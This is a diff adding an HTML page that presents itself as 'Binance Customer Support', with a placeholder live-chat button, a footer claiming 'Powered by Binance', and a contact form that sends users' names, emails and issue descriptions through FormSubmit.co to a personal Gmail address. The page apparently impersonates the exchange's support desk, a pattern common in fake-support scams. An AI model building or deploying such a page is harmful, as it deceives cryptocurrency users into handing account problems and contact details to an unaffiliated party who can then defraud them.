@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Customer Support</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for the Inter font and smooth scrolling */
+        body {
+            font-family: 'Inter', sans-serif;
+            scroll-behavior: smooth;
+        }
+        /* Basic scrollbar styling for better aesthetics */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a202c; /* Dark background */
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #4a5568; /* Greyish thumb */
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #6b7280; /* Lighter grey on hover */
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-gray-900 to-black text-gray-100 min-h-screen flex flex-col">
+
+    <!-- Header Section -->
+    <header class="bg-gray-800 p-4 shadow-lg">
+        <div class="container mx-auto flex flex-col md:flex-row justify-between items-center">
+            <div class="flex items-center space-x-3 mb-4 md:mb-0">
+                <!-- Binance Logo Placeholder -->
+                <img src="https://placehold.co/40x40/FCD535/000000?text=BNB" alt="Binance Logo" class="rounded-full shadow-md" onerror="this.onerror=null;this.src='https://placehold.co/40x40/FCD535/000000?text=BNB';">
+                <h1 class="text-3xl font-bold text-yellow-400">Binance Support</h1>
+            </div>
+            <nav class="w-full md:w-auto">
+                <ul class="flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-8 text-lg">
+                    <li><a href="#home" class="hover:text-yellow-400 transition duration-300 ease-in-out">Home</a></li>
+                    <li><a href="#live-chat" class="hover:text-yellow-400 transition duration-300 ease-in-out">Live Chat</a></li>
+                    <li><a href="#contact-us" class="hover:text-yellow-400 transition duration-300 ease-in-out">Contact Us</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow container mx-auto p-4 md:p-8 space-y-12">
+
+        <!-- Home/Hero Section -->
+        <section id="home" class="bg-gray-800 p-8 rounded-xl shadow-2xl text-center animate-fade-in">
+            <h2 class="text-5xl font-extrabold text-yellow-300 mb-6">Welcome to Binance Customer Support</h2>
+            <p class="text-lg text-gray-300 max-w-3xl mx-auto leading-relaxed">
+                We're here to help you with any questions or issues you might have regarding your Binance account,
+                transactions, security, or any other services. Our dedicated team is committed to providing
+                you with timely and effective assistance.
+            </p>
+            <div class="mt-8 flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-6">
+                <a href="#live-chat" class="bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-bold py-3 px-8 rounded-full shadow-lg transition duration-300 ease-in-out transform hover:scale-105">
+                    Start Live Chat
+                </a>
+                <a href="#contact-us" class="bg-transparent border-2 border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-gray-900 font-bold py-3 px-8 rounded-full shadow-lg transition duration-300 ease-in-out transform hover:scale-105">
+                    Submit a Ticket
+                </a>
+            </div>
+        </section>
+
+        <!-- Live Chat Section -->
+        <section id="live-chat" class="bg-gray-800 p-8 rounded-xl shadow-2xl">
+            <h2 class="text-4xl font-bold text-yellow-300 mb-6 text-center">Live Chat Support</h2>
+            <p class="text-lg text-gray-300 text-center max-w-2xl mx-auto mb-8">
+                Our live chat agents are available to assist you in real-time. Please note that a full,
+                functional live chat system requires complex backend infrastructure and a separate chat service
+                integration (e.g., Zendesk, Intercom, or a custom solution).
+            </p>
+            <div class="flex justify-center">
+                <button onclick="alert('This is a placeholder for a live chat integration. In a real application, clicking this would open a chat widget or connect you to a live agent.')"
+                        class="bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-bold py-4 px-12 rounded-full shadow-lg text-xl
+                               transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-yellow-300 focus:ring-opacity-75">
+                    Connect to Live Agent
+                </button>
+            </div>
+            <p class="text-sm text-gray-400 text-center mt-6">
+                (This button is a placeholder. For a real live chat, you would integrate a third-party chat widget here.)
+            </p>
+        </section>
+
+        <!-- Contact Us Section with FormSubmit.co -->
+        <section id="contact-us" class="bg-gray-800 p-8 rounded-xl shadow-2xl">
+            <h2 class="text-4xl font-bold text-yellow-300 mb-6 text-center">Contact Our Support Team</h2>
+            <p class="text-lg text-gray-300 text-center max-w-2xl mx-auto mb-8">
+                If you prefer, you can send us a message using the form below. We aim to respond to all inquiries within 24-48 hours.
+            </p>
+            <form action="https://formsubmit.co/csma026@gmail.com" method="POST" class="max-w-xl mx-auto space-y-6">
+                <!-- IMPORTANT: Replace 'your@email.com' with your actual email address -->
+                <!-- Example: action="https://formsubmit.co/support@binance.com" -->
+
+                <!-- Honeypot (prevents spam bots) -->
+                <input type="text" name="_honeypot" style="display:none">
+
+                <!-- Disable Captcha (optional, but recommended for testing) -->
+                <!-- Remove this line if you want reCAPTCHA enabled by FormSubmit.co -->
+                <input type="hidden" name="_captcha" value="false">
+
+                <!-- Subject for your email -->
+                <input type="hidden" name="_subject" value="New Support Request from Binance Website!">
+
+                <!-- Autoresponse to sender (optional) -->
+                <input type="hidden" name="_autoresponse" value="Thank you for contacting Binance Support. We have received your message and will get back to you shortly.">
+
+                <div>
+                    <label for="name" class="block text-gray-200 text-lg font-medium mb-2">Your Name</label>
+                    <input type="text" id="name" name="name" placeholder="John Doe" required
+                           class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 text-gray-200 shadow-md transition duration-200">
+                </div>
+                <div>
+                    <label for="email" class="block text-gray-200 text-lg font-medium mb-2">Your Email</label>
+                    <input type="email" id="email" name="email" placeholder="john.doe@example.com" required
+                           class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 text-gray-200 shadow-md transition duration-200">
+                </div>
+                <div>
+                    <label for="subject" class="block text-gray-200 text-lg font-medium mb-2">Subject</label>
+                    <input type="text" id="subject" name="subject" placeholder="Account Inquiry / Transaction Issue" required
+                           class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 text-gray-200 shadow-md transition duration-200">
+                </div>
+                <div>
+                    <label for="message" class="block text-gray-200 text-lg font-medium mb-2">Your Message</label>
+                    <textarea id="message" name="message" rows="6" placeholder="Please describe your issue in detail..." required
+                              class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 text-gray-200 shadow-md transition duration-200 resize-y"></textarea>
+                </div>
+                <div class="flex justify-center">
+                    <button type="submit"
+                            class="bg-yellow-500 hover:bg-yellow-600 text-gray-900 font-bold py-3 px-8 rounded-full shadow-lg text-xl
+                                   transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-yellow-300 focus:ring-opacity-75">
+                        Submit Message
+                    </button>
+                </div>
+            </form>
+        </section>
+
+    </main>
+
+    <!-- Footer Section -->
+    <footer class="bg-gray-800 p-4 text-center text-gray-400 mt-8 shadow-inner">
+        <div class="container mx-auto">
+            <p>&copy; 2025 Binance Customer Support. All rights reserved.</p>
+            <p class="mt-2 text-sm">Powered by Binance.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
